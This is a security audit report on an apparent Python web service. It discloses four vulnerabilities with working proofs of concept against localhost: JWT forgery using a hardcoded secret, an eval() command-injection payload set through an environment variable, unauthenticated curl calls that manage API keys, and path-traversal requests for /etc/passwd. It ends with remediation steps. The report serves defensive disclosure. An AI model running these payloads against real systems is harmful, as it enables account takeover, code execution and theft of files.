# Cybersecurity Vulnerability Review (REAA)

Date: 2026-04-17  
Scope: `webui/` and `core/` Python services

## Executive Summary

I found multiple high-impact vulnerabilities, including:

1. **Critical**: JWT tokens are signed with a known default secret (`default_secret_key`), allowing token forgery.
2. **High**: Arbitrary code execution via unsafe `eval()` of environment variables.
3. **High**: Unauthenticated API key listing/creation/revocation endpoints.
4. **High**: Path traversal enabling arbitrary file read in file-serving routes.

---

## Findings and PoC

## 1) Predictable JWT secret enables token forgery (Critical)

### Impact
Any attacker who can reach auth-protected endpoints can mint valid JWTs and impersonate users (including admin if user ID is known/guessable).

### Evidence
- `auth_manager = AuthManager()` is created at import time; outside Flask app context, `current_app` is unavailable.
- `AuthManager.__init__` falls back to a static hardcoded secret: `default_secret_key`.
- `webui/app.py` imports `auth_manager` before creating/configuring `Flask` app.

### Affected code
- `webui/auth.py`
- `webui/app.py`

### PoC
```bash
python - <<'PY'
import jwt, datetime
secret = 'default_secret_key'
payload = {
  'user_id': 1,
  'iat': datetime.datetime.utcnow(),
  'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=24),
}
print(jwt.encode(payload, secret, algorithm='HS256'))
PY
```

Use produced token:
```bash
curl -s http://127.0.0.1:5000/api/auth/me \
  -H "Authorization: Bearer <FORGED_TOKEN>"
```

Expected: request is accepted as user `1` if that account exists and session checks are satisfied.

---

## 2) Remote code execution via `eval()` on env vars (High)

### Impact
If attacker controls environment variables or deployment config (common in CI/CD, container env injection, misconfigured `.env` write access), they can execute arbitrary Python code in backend process.

### Evidence
`core/llm_refiner.py` uses:
- `eval(settings.LLM4DECOMPILE_MAX_MEMORY)`
- `eval(settings.LLM4DECOMPILE_QUANTIZATION)`

### Affected code
- `core/llm_refiner.py`

### PoC
```bash
export LLM4DECOMPILE_MAX_MEMORY="__import__('os').system('touch /tmp/reaa_eval_poc') or {}"
python - <<'PY'
from core.llm_refiner import LLMRefiner
r = LLMRefiner(model_path='dummy-model')
r.load_model()  # eval() executes while building model_kwargs
print('done')
PY
ls -l /tmp/reaa_eval_poc
```

Expected: `/tmp/reaa_eval_poc` is created.

---

## 3) Unauthenticated API key management (High)

### Impact
Anyone can:
- list all API keys,
- create new valid API keys,
- revoke keys.

This completely breaks trust boundaries of remote collaboration/auth flows.

### Evidence
Routes do not use `@token_required` / admin guard:
- `GET /api/remote/api-keys`
- `POST /api/remote/api-keys`
- `DELETE /api/remote/api-keys/<key>`

### Affected code
- `webui/app.py`

### PoC
```bash
# 1) List active keys (no auth)
curl -s http://127.0.0.1:5000/api/remote/api-keys

# 2) Mint a new valid key (no auth)
curl -s -X POST http://127.0.0.1:5000/api/remote/api-keys

# 3) Revoke any key (no auth)
curl -s -X DELETE http://127.0.0.1:5000/api/remote/api-keys/<KEY>
```

Expected: all operations succeed without authentication.

---

## 4) Path traversal in file-read endpoints (High)

### Impact
Arbitrary local file read (sensitive configs, secrets, keys, source code), depending on process permissions.

### Evidence
User-controlled `job_id` / `filename` are directly passed to `os.path.join(...)` and read without canonical path validation.
Examples:
- `/api/jobs/<job_id>/pseudocode/<filename>`
- `/results/<job_id>/function/<addr>/refine`
- `/api/jobs/<job_id>/diff/<filename>`

### Affected code
- `webui/app.py`

### PoC
```bash
curl -s "http://127.0.0.1:5000/api/jobs/demo/pseudocode/../../../../../../etc/passwd"
```

If Flask routing blocks slashes in `<filename>`, URL-encode traversal payload:
```bash
curl -s "http://127.0.0.1:5000/api/jobs/demo/pseudocode/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
```

Expected: response includes file content from outside intended `data/<job>/artifacts/pseudocode/` directory.

---

## Recommended Remediation (Priority Order)

1. **JWT hardening (Immediate)**
   - Remove hardcoded fallback secret entirely.
   - Inject secret from secure env/secret manager at startup and fail-fast if missing.
   - Rotate existing tokens/sessions.

2. **Remove `eval()` (Immediate)**
   - Replace with strict parsers (`json.loads`, schema validation, explicit dict parsing).
   - Reject invalid types; never execute config as code.

3. **Enforce authz on key management (Immediate)**
   - Require `@token_required` + admin role checks.
   - Audit logs for key operations.

4. **Prevent path traversal**
   - Use allowlisted filenames.
   - Resolve canonical paths and verify they remain under intended base dir (`Path.resolve()` + prefix check).

5. **Defense-in-depth**
   - Add security tests (authz, traversal, token forgery regression tests).
   - Add SAST/DAST checks in CI.

